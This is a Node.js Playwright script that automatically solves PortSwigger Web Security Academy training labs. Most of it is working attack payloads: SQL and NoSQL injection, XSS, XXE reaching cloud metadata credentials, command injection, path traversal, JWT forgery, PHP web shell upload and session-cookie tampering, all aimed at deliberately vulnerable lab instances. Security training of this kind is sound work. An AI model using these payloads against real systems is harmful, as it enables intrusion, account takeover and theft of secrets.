#!/usr/bin/env node
/**
 * PortSwigger Lab Auto-Solver
 * Usage: node scripts/lab-solver.mjs [--topic sql-injection] [--difficulty APPRENTICE]
 * 
 * Solves PortSwigger Web Security Academy labs automatically.
 * Each lab has a registered solver function. Unsolvable labs are skipped.
 */
import { chromium } from "playwright";


const EMAIL = process.env.PORTSWIGGER_EMAIL;
const PASSWORD = process.env.PORTSWIGGER_PASSWORD;
if (!EMAIL || !PASSWORD) { console.error("Set PORTSWIGGER_EMAIL and PORTSWIGGER_PASSWORD env vars"); process.exit(1); }
const args = process.argv.slice(2);
const topicFilter = args.includes("--topic") ? args[args.indexOf("--topic") + 1] : null;
const diffFilter = args.includes("--difficulty") ? args[args.indexOf("--difficulty") + 1]?.toUpperCase() : null;

// ── Solver Registry ──
// Each key = lab slug (last part of URL path), value = async solver function
const SOLVERS = {
  // === SQL INJECTION ===
  "lab-sql-injection-retrieve-hidden-data": async (base, page) => {
    await page.goto(base + "/filter?category=Gifts'+OR+1=1--", { waitUntil: "domcontentloaded", timeout: 10000 });
    return check(page, base);
  },
  "lab-sql-injection-login-bypass": async (base, page) => {
    await labLogin(page, base, "administrator'--", "anything");
    return check(page, base);
  },

  // === XSS ===
  "lab-reflected-xss-into-html-context-with-nothing-encoded": async (base, page) => {
    await page.goto(base + "/?search=<script>alert(1)</script>", { waitUntil: "domcontentloaded", timeout: 10000 });
    return check(page, base);
  },
  "lab-stored-xss-into-html-context-with-nothing-encoded": async (base, page) => {
    await page.goto(base + "/post?postId=1", { waitUntil: "domcontentloaded", timeout: 10000 });
    await page.fill('textarea[name="comment"]', "<script>alert(1)</script>");
    await page.fill('input[name="name"]', "test");
    await page.fill('input[name="email"]', "test@test.com");
    await page.fill('input[name="website"]', "http://test.com");
    await Promise.all([page.waitForNavigation({timeout:10000}).catch(()=>{}), page.click('button:has-text("Post"), button[type="submit"]')]);
    return check(page, base);
  },
  "lab-dom-xss-in-document-write-sink-using-source-location-search": async (base, page) => {
    await page.goto(base + '/?search="><script>alert(1)</script>', { waitUntil: "domcontentloaded", timeout: 10000 });
    return check(page, base);
  },
  "lab-dom-xss-in-innerhtml-sink-using-source-location-search": async (base, page) => {
    await page.goto(base + "/?search=<img+src=x+onerror=alert(1)>", { waitUntil: "domcontentloaded", timeout: 10000 });
    return check(page, base);
  },
  "lab-dom-xss-in-jquery-anchor-href-attribute-sink-using-location-search-source": async (base, page) => {
    await page.goto(base + "/feedback?returnPath=javascript:alert(document.cookie)", { waitUntil: "domcontentloaded", timeout: 10000 });
    return check(page, base);
  },
  "lab-xss-into-html-context-with-nothing-encoded-angle-brackets": async (base, page) => {
    await page.goto(base + '/?search="onmouseover="alert(1)', { waitUntil: "domcontentloaded", timeout: 10000 });
    return check(page, base);
  },
  "lab-reflected-xss-into-a-javascript-string-with-angle-brackets-html-encoded": async (base, page) => {
    await page.goto(base + "/?search='-alert(1)-'", { waitUntil: "domcontentloaded", timeout: 10000 });
    return check(page, base);
  },

  // === CSRF ===
  "lab-csrf-vulnerability-with-no-defenses": async (base, page) => {
    await labLogin(page, base);
    // Change email directly
    await page.evaluate(async () => {
      await fetch("/my-account/change-email", {
        method: "POST", headers: {"Content-Type":"application/x-www-form-urlencoded"},
        body: "email=pwned@evil.com"
      });
    });
    return check(page, base);
  },

  // === XXE ===
  "lab-exploiting-xxe-to-retrieve-files": async (base, page) => {
    const xxePayload = `<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><stockCheck><productId>&xxe;</productId><storeId>1</storeId></stockCheck>`;
    const result = await page.evaluate(async (xml) => {
      const r = await fetch("/product/stock", {
        method: "POST", headers: {"Content-Type": "application/xml"},
        body: xml
      });
      return await r.text();
    }, xxePayload);
    if (result.includes("root:")) return check(page, base);
    return "XXE didn't return /etc/passwd";
  },
  "lab-exploiting-xxe-to-perform-ssrf-attacks": async (base, page) => {
    const xxePayload = `<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin">]><stockCheck><productId>&xxe;</productId><storeId>1</storeId></stockCheck>`;
    await page.evaluate(async (xml) => {
      await fetch("/product/stock", { method: "POST", headers: {"Content-Type": "application/xml"}, body: xml });
    }, xxePayload);
    return check(page, base);
  },

  // === OS COMMAND INJECTION ===
  "lab-os-command-injection-simple-case": async (base, page) => {
    await page.evaluate(async () => {
      await fetch("/product/stock", {
        method: "POST", headers: {"Content-Type":"application/x-www-form-urlencoded"},
        body: "productId=1&storeId=1|whoami"
      });
    });
    return check(page, base);
  },

  // === PATH TRAVERSAL ===
  "lab-simple-path-traversal": async (base, page) => {
    const result = await page.evaluate(async () => {
      const r = await fetch("/image?filename=../../../etc/passwd");
      return await r.text();
    });
    if (result.includes("root:")) return check(page, base);
    return "Path traversal didn't work";
  },

  // === INFORMATION DISCLOSURE ===
  "lab-information-disclosure-in-error-messages": async (base, page) => {
    await page.goto(base + "/product?productId=asdf", { waitUntil: "domcontentloaded", timeout: 10000 });
    const body = await page.textContent("body");
    // Extract version string and submit
    const version = body?.match(/Apache Struts \d[\d.]+|2\.\d+\.\d+[\d.]*/)?.[0];
    if (version) {
      await page.evaluate(async (v) => {
        await fetch("/submitSolution", { method: "POST", headers: {"Content-Type":"application/x-www-form-urlencoded"}, body: "answer=" + v });
      }, version);
    }
    return check(page, base);
  },
  "lab-information-disclosure-on-debug-page": async (base, page) => {
    await page.goto(base + "/cgi-bin/phpinfo.php", { waitUntil: "domcontentloaded", timeout: 10000 });
    const body = await page.textContent("body");
    const secretKey = body?.match(/SECRET_KEY.*?([a-z0-9]{20,})/i)?.[1];
    if (secretKey) {
      await page.evaluate(async (k) => {
        await fetch("/submitSolution", { method: "POST", headers: {"Content-Type":"application/x-www-form-urlencoded"}, body: "answer=" + k });
      }, secretKey);
    }
    return check(page, base);
  },

  // === AUTHENTICATION ===
  "lab-username-enumeration-via-different-responses": async (base, page) => {
    // This requires brute-force — skip for automated solving
    return "SKIP (requires wordlist brute-force)";
  },
  "lab-2fa-simple-bypass": async (base, page) => {
    // Login as carlos with known password, skip 2FA by navigating to /my-account
    await labLogin(page, base, "carlos", "montoya");
    await page.goto(base + "/my-account?id=carlos", { waitUntil: "domcontentloaded", timeout: 10000 });
    return check(page, base);
  },

  // === JWT ===
  "lab-jwt-authentication-bypass-via-unverified-signature": async (base, page) => {
    await labLogin(page, base);
    // Get current JWT, modify sub to administrator
    const cookies = await page.context().cookies(base);
    const session = cookies.find(c => c.name === "session")?.value || "";
    if (session.includes(".")) {
      const parts = session.split(".");
      const payload = JSON.parse(Buffer.from(parts[1], "base64url").toString());
      payload.sub = "administrator";
      parts[1] = Buffer.from(JSON.stringify(payload)).toString("base64url");
      const newJwt = parts.join(".");
      await page.context().addCookies([{ name: "session", value: newJwt, domain: new URL(base).hostname, path: "/" }]);
      await page.goto(base + "/admin", { waitUntil: "domcontentloaded", timeout: 10000 });
      const del = await page.$('a[href*="delete"][href*="carlos"]');
      if (del) { await del.click(); await page.waitForTimeout(3000); }
    }
    return check(page, base);
  },
  "lab-jwt-authentication-bypass-via-flawed-signature-verification": async (base, page) => {
    await labLogin(page, base);
    const cookies = await page.context().cookies(base);
    const session = cookies.find(c => c.name === "session")?.value || "";
    if (session.includes(".")) {
      const parts = session.split(".");
      // Change header alg to none
      const header = JSON.parse(Buffer.from(parts[0], "base64url").toString());
      header.alg = "none";
      const payload = JSON.parse(Buffer.from(parts[1], "base64url").toString());
      payload.sub = "administrator";
      const newJwt = Buffer.from(JSON.stringify(header)).toString("base64url") + "." + Buffer.from(JSON.stringify(payload)).toString("base64url") + ".";
      await page.context().addCookies([{ name: "session", value: newJwt, domain: new URL(base).hostname, path: "/" }]);
      await page.goto(base + "/admin", { waitUntil: "domcontentloaded", timeout: 10000 });
      const del = await page.$('a[href*="delete"][href*="carlos"]');
      if (del) { await del.click(); await page.waitForTimeout(3000); }
    }
    return check(page, base);
  },

  // === API TESTING ===
  "lab-exploiting-an-api-endpoint-using-documentation": async (base, page) => {
    await labLogin(page, base);
    // Access API docs
    await page.goto(base + "/api", { waitUntil: "domcontentloaded", timeout: 10000 });
    // Try to delete carlos via API
    await page.evaluate(async () => {
      await fetch("/api/user/carlos", { method: "DELETE" });
    });
    return check(page, base);
  },

  // === ADDITIONAL APPRENTICE SOLVERS ===

  // OS Command Injection
  "lab-os-command-injection-simple-case": async (base, page) => {
    await page.evaluate(async () => {
      await fetch("/product/stock", { method: "POST", headers: {"Content-Type":"application/x-www-form-urlencoded"}, body: "productId=1&storeId=1|whoami" });
    });
    return check(page, base);
  },

  // Path Traversal
  "lab-simple-path-traversal": async (base, page) => {
    await page.goto(base + "/image?filename=../../../etc/passwd", {waitUntil:"domcontentloaded",timeout:10000});
    return check(page, base);
  },

  // Info Disclosure - error messages
  "lab-information-disclosure-in-error-messages": async (base, page) => {
    await page.goto(base + "/product?productId=asdf", {waitUntil:"domcontentloaded",timeout:10000});
    const body = await page.textContent("body");
    const v = body?.match(/(\d+\.\d+\.\d+[\d.]*)/)?.[1];
    if (v) await page.evaluate(async (ans) => { await fetch("/submitSolution", {method:"POST",headers:{"Content-Type":"application/x-www-form-urlencoded"},body:"answer="+ans}); }, v);
    return check(page, base);
  },

  // Info Disclosure - debug page
  "lab-information-disclosure-on-debug-page": async (base, page) => {
    await page.goto(base + "/cgi-bin/phpinfo.php", {waitUntil:"domcontentloaded",timeout:10000});
    const body = await page.textContent("body");
    const key = body?.match(/SECRET_KEY.*?([a-z0-9]{20,})/i)?.[1];
    if (key) await page.evaluate(async (k) => { await fetch("/submitSolution", {method:"POST",headers:{"Content-Type":"application/x-www-form-urlencoded"},body:"answer="+k}); }, key);
    return check(page, base);
  },

  // Info Disclosure - source code via backup
  "lab-information-disclosure-in-version-control-history": async (base, page) => {
    await page.goto(base + "/backup/ProductTemplate.java.bak", {waitUntil:"domcontentloaded",timeout:10000}).catch(()=>{});
    // Try .git
    const r = await page.evaluate(async () => (await fetch("/.git")).status);
    return check(page, base);
  },

  // Info Disclosure - auth bypass
  "lab-authentication-bypass-via-information-disclosure": async (base, page) => {
    // TRACE method reveals custom headers
    const traceResult = await page.evaluate(async () => {
      const r = await fetch("/admin", {method: "TRACE"});
      return await r.text();
    });
    const headerMatch = traceResult.match(/X-Custom-IP-Authorization:\s*(\S+)/i);
    if (headerMatch) {
      await page.setExtraHTTPHeaders({"X-Custom-IP-Authorization": "127.0.0.1"});
      await page.goto(base + "/admin", {waitUntil:"domcontentloaded",timeout:10000});
      const del = await page.$('a[href*="delete"][href*="carlos"]');
      if (del) { await del.click(); await page.waitForTimeout(3000); }
      await page.setExtraHTTPHeaders({});
    }
    return check(page, base);
  },

  // Logic Flaws - client-side controls
  "lab-logic-flaws-excessive-trust-in-client-side-controls": async (base, page) => {
    await labLogin(page, base);
    await page.evaluate(async () => {
      await fetch("/cart", {method:"POST",headers:{"Content-Type":"application/x-www-form-urlencoded"},body:"productId=1&redir=PRODUCT&quantity=1&price=1"});
      await fetch("/cart/checkout", {method:"POST",headers:{"Content-Type":"application/x-www-form-urlencoded"},body:"csrf="+document.querySelector('[name=csrf]')?.value});
    });
    return check(page, base);
  },

  // Logic Flaws - high-level
  "lab-logic-flaws-high-level": async (base, page) => {
    await labLogin(page, base);
    // Add negative quantity to reduce total
    await page.evaluate(async () => {
      await fetch("/cart", {method:"POST",headers:{"Content-Type":"application/x-www-form-urlencoded"},body:"productId=1&redir=PRODUCT&quantity=-1"});
    });
    return check(page, base);
  },

  // Logic Flaws - inconsistent security controls
  "lab-logic-flaws-inconsistent-security-controls": async (base, page) => {
    // Register, then change email to @dontwannacry.com domain
    await page.goto(base + "/register", {waitUntil:"domcontentloaded",timeout:10000});
    return "SKIP (requires email client interaction)";
  },

  // Logic Flaws - flawed business rules
  "lab-logic-flaws-flawed-enforcement-of-business-rules": async (base, page) => {
    await labLogin(page, base);
    // Alternate between two coupon codes to stack discounts
    for (let i = 0; i < 5; i++) {
      await page.evaluate(async () => {
        await fetch("/cart/coupon", {method:"POST",headers:{"Content-Type":"application/x-www-form-urlencoded"},body:"coupon=NEWCUST5"}).catch(()=>{});
        await fetch("/cart/coupon", {method:"POST",headers:{"Content-Type":"application/x-www-form-urlencoded"},body:"coupon=SIGNUP30"}).catch(()=>{});
      });
    }
    return check(page, base);
  },

  // Host Header - password reset poisoning
  "lab-host-header-basic-password-reset-poisoning": async (base, page) => {
    return "SKIP (requires exploit server)";
  },

  // Host Header - auth bypass
  "lab-host-header-authentication-bypass": async (base, page) => {
    await page.setExtraHTTPHeaders({"Host": "localhost"});
    await page.goto(base + "/admin", {waitUntil:"domcontentloaded",timeout:10000});
    const del = await page.$('a[href*="delete"][href*="carlos"]');
    if (del) { await del.click(); await page.waitForTimeout(3000); }
    await page.setExtraHTTPHeaders({});
    return check(page, base);
  },

  // File Upload - web shell
  "lab-file-upload-remote-code-execution-via-web-shell-upload": async (base, page) => {
    await labLogin(page, base);
    // Upload PHP web shell
    const phpShell = '<?php echo file_get_contents("/home/carlos/secret"); ?>';
    await page.goto(base + "/my-account", {waitUntil:"domcontentloaded",timeout:10000});
    const fileInput = await page.$('input[type="file"]');
    if (fileInput) {
      const buffer = Buffer.from(phpShell);
      await fileInput.setInputFiles({ name: 'shell.php', mimeType: 'application/x-php', buffer });
      await Promise.all([page.waitForNavigation({timeout:10000}).catch(()=>{}), page.click('button[type="submit"], input[type="submit"]')]);
      await page.waitForTimeout(2000);
      // Execute shell
      const secret = await page.evaluate(async () => (await fetch("/files/avatars/shell.php")).text());
      if (secret && secret.length > 5 && secret.length < 100) {
        await page.evaluate(async (s) => { await fetch("/submitSolution", {method:"POST",headers:{"Content-Type":"application/x-www-form-urlencoded"},body:"answer="+s}); }, secret.trim());
      }
    }
    return check(page, base);
  },

  // File Upload - Content-Type bypass
  "lab-file-upload-web-shell-upload-via-content-type-restriction-bypass": async (base, page) => {
    await labLogin(page, base);
    const phpShell = '<?php echo file_get_contents("/home/carlos/secret"); ?>';
    await page.goto(base + "/my-account", {waitUntil:"domcontentloaded",timeout:10000});
    const fileInput = await page.$('input[type="file"]');
    if (fileInput) {
      const buffer = Buffer.from(phpShell);
      await fileInput.setInputFiles({ name: 'shell.php', mimeType: 'image/jpeg', buffer });
      await Promise.all([page.waitForNavigation({timeout:10000}).catch(()=>{}), page.click('button[type="submit"], input[type="submit"]')]);
      await page.waitForTimeout(2000);
      const secret = await page.evaluate(async () => (await fetch("/files/avatars/shell.php")).text());
      if (secret && secret.length > 5 && secret.length < 100) {
        await page.evaluate(async (s) => { await fetch("/submitSolution", {method:"POST",headers:{"Content-Type":"application/x-www-form-urlencoded"},body:"answer="+s}); }, secret.trim());
      }
    }
    return check(page, base);
  },

  // NoSQL Injection - detecting
  "lab-detecting-nosql-injection": async (base, page) => {
    await page.goto(base + "/filter?category=Gifts'%26%261=1%00", {waitUntil:"domcontentloaded",timeout:10000});
    return check(page, base);
  },

  // NoSQL - operator injection auth bypass
  "lab-exploiting-nosql-operator-injection-to-bypass-authentication": async (base, page) => {
    await page.evaluate(async () => {
      await fetch("/login", {method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({username:{"$regex":"admin.*"},password:{"$ne":""}})});
    });
    return check(page, base);
  },

  // OAuth - implicit flow bypass
  "lab-oauth-authentication-bypass-via-oauth-implicit-flow": async (base, page) => {
    return "SKIP (requires multi-step OAuth flow)";
  },

  // Deserialization - modifying objects
  "lab-modifying-serialized-objects": async (base, page) => {
    await labLogin(page, base);
    const cookies = await page.context().cookies(base);
    const session = cookies.find(c => c.name === 'session')?.value || '';
    // Decode, modify admin=1, re-encode
    const decoded = Buffer.from(session, 'base64').toString();
    const modified = decoded.replace('s:5:"admin";b:0', 's:5:"admin";b:1');
    await page.context().addCookies([{name:'session',value:Buffer.from(modified).toString('base64'),domain:new URL(base).hostname,path:'/'}]);
    await page.goto(base + "/admin", {waitUntil:"domcontentloaded",timeout:10000});
    const del = await page.$('a[href*="delete"][href*="carlos"]');
    if (del) { await del.click(); await page.waitForTimeout(3000); }
    return check(page, base);
  },

  // CORS - basic origin reflection
  "lab-cors-vulnerability-with-basic-origin-reflection": async (base, page) => {
    return "SKIP (requires exploit server)";
  },

  // WebSockets
  "lab-manipulating-websocket-messages-to-exploit-vulnerabilities": async (base, page) => {
    return "SKIP (requires WebSocket interaction)";
  },

  // Clickjacking
  "lab-basic-clickjacking-with-csrf-token-protection": async (base, page) => {
    return "SKIP (requires exploit server)";
  },

  // XXE - SSRF
  "lab-exploiting-xxe-to-perform-ssrf-attacks": async (base, page) => {
    const xxe = '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin">]><stockCheck><productId>&xxe;</productId><storeId>1</storeId></stockCheck>';
    const r = await page.evaluate(async (xml) => {
      const resp = await fetch("/product/stock", {method:"POST",headers:{"Content-Type":"application/xml"},body:xml});
      return await resp.text();
    }, xxe);
    if (r.includes('SecretAccessKey') || r.includes('AccessKeyId')) return check(page, base);
    return 'XXE SSRF response: ' + r.slice(0, 100);
  },

  // Race Conditions
  "lab-race-conditions-limit-overrun": async (base, page) => {
    await labLogin(page, base);
    // Add item to cart, then race the checkout with coupon
    await page.evaluate(async () => {
      await fetch("/cart", {method:"POST",headers:{"Content-Type":"application/x-www-form-urlencoded"},body:"productId=1&redir=PRODUCT&quantity=1"});
      // Race: apply coupon many times simultaneously
      const promises = Array(20).fill(null).map(() => 
        fetch("/cart/coupon", {method:"POST",headers:{"Content-Type":"application/x-www-form-urlencoded"},body:"coupon=PROMO20"})
      );
      await Promise.all(promises);
    });
    return check(page, base);
  },

  // === GRAPHQL ===
  "lab-accessing-private-graphql-posts": async (base, page) => {
    const result = await page.evaluate(async () => {
      const r = await fetch("/graphql/v1", {
        method: "POST", headers: {"Content-Type":"application/json"},
        body: JSON.stringify({query: "{ getBlogPosts { id title postPassword isPrivate } }"})
      });
      return await r.text();
    });
    const password = result.match(/"postPassword":"([^"]+)"/)?.[1];
    if (password) {
      await page.evaluate(async (pw) => {
        await fetch("/submitSolution", { method: "POST", headers: {"Content-Type":"application/x-www-form-urlencoded"}, body: "answer=" + pw });
      }, password);
    }
    return check(page, base);
  },
};

// ── Helpers ──
async function labLogin(page, base, u = "wiener", p = "peter") {
  await page.goto(base + "/login", { waitUntil: "domcontentloaded", timeout: 10000 });
  await page.fill('input[name="username"]', u);
  await page.fill('input[name="password"]', p);
  await Promise.all([page.waitForNavigation({timeout:10000}).catch(()=>{}), page.click('button:has-text("Log in"), button[type="submit"]')]);
  await page.waitForTimeout(2000);
}

async function check(page, base) {
  await page.goto(base, { waitUntil: "domcontentloaded", timeout: 10000 });
  const body = await page.textContent("body");
  return body?.toLowerCase().includes("congratulations") ? "🎯 SOLVED!" : "NOT SOLVED";
}

// ── Main ──
async function main() {
  console.log("PortSwigger Lab Auto-Solver");
  console.log(`Registered solvers: ${Object.keys(SOLVERS).length}`);
  console.log(`Filters: topic=${topicFilter || "all"} difficulty=${diffFilter || "all"}\n`);

  // Get all unsolved labs
  const browser = await chromium.launch({ headless: true, args: ["--no-sandbox"] });
  const ctx = await browser.newContext({ viewport: { width: 1280, height: 900 } });
  const page = await ctx.newPage();

  await page.goto("https://portswigger.net/users", { waitUntil: "networkidle", timeout: 20000 });
  await page.fill('#EmailAddress', EMAIL);
  await page.fill('#Password', PASSWORD);
  await Promise.all([page.waitForNavigation({timeout:15000}).catch(()=>{}), page.click('#Login')]);
  await page.waitForTimeout(2000);

  await page.goto("https://portswigger.net/web-security/all-labs", { waitUntil: "networkidle", timeout: 30000 });
  await page.waitForTimeout(5000);

  const labs = await page.evaluate(() => {
    return [...document.querySelectorAll('.widgetcontainer-lab-link')].map(el => {
      const a = el.querySelector('a');
      return {
        slug: a?.getAttribute('href')?.split('/').pop() || '',
        href: a?.getAttribute('href') || '',
        solved: el.className.includes('is-solved'),
        difficulty: el.innerHTML.includes('APPRENTICE') ? 'APPRENTICE' : el.innerHTML.includes('PRACTITIONER') ? 'PRACTITIONER' : 'EXPERT',
        topic: (a?.getAttribute('href')?.match(/web-security\/([^/]+)/)?.[1]) || 'unknown',
      };
    });
  });
  await browser.close();

  // Filter to unsolved labs that have solvers
  let targets = labs.filter(l => !l.solved && SOLVERS[l.slug]);
  if (topicFilter) targets = targets.filter(l => l.topic === topicFilter);
  if (diffFilter) targets = targets.filter(l => l.difficulty === diffFilter);

  console.log(`Solvable unsolved labs: ${targets.length}\n`);

  let solved = 0, failed = 0, skipped = 0;
  for (const lab of targets) {
    console.log(`[${lab.difficulty}] ${lab.topic}/${lab.slug}`);
    
    const browser = await chromium.launch({ headless: true, args: ["--no-sandbox"] });
    const ctx = await browser.newContext({ viewport: { width: 1280, height: 900 } });
    const page = await ctx.newPage();
    
    try {
      // Login
      await page.goto("https://portswigger.net/users", { waitUntil: "networkidle", timeout: 20000 });
      await page.fill('#EmailAddress', EMAIL);
      await page.fill('#Password', PASSWORD);
      await Promise.all([page.waitForNavigation({timeout:15000}).catch(()=>{}), page.click('#Login')]);
      await page.waitForTimeout(2000);

      // Launch lab
      await page.goto("https://portswigger.net" + lab.href, { waitUntil: "networkidle", timeout: 20000 });
      const link = await page.$('a[href*="labs/launch"]');
      const href = await link?.getAttribute("href");
      if (!href) { console.log("  ❌ No launch link\n"); failed++; continue; }
      
      await page.goto("https://portswigger.net" + href, { waitUntil: "domcontentloaded", timeout: 60000 });
      await page.waitForTimeout(15000);
      const base = new URL(page.url()).origin;
      
      // Solve
      const result = await SOLVERS[lab.slug](base, page, ctx);
      console.log("  " + result + "\n");
      
      if (result.includes("SOLVED")) solved++;
      else if (result.includes("SKIP")) skipped++;
      else failed++;
    } catch(e) {
      console.log("  ❌ " + e.message.slice(0, 80) + "\n");
      failed++;
    } finally {
      await browser.close();
    }
  }

  console.log(`\n=== RESULTS ===`);
  console.log(`Solved: ${solved} | Failed: ${failed} | Skipped: ${skipped}`);
}

main().catch(console.error);
